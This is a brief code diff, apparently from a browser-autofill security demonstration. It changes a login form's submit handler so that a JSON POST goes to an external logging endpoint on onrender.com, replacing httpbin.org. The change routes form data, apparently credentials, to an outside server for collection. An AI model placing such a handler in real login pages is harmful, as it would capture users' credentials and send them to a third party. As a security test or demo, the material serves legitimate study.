@@ -25,7 +25,7 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   );
 
   // Attempt to send to mock endpoint (will fail due to CORS, but demonstrates the concept)
-  fetch("https://httpbin.org/post", {
+  fetch("https://autofill-security-test-server.onrender.com/log", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
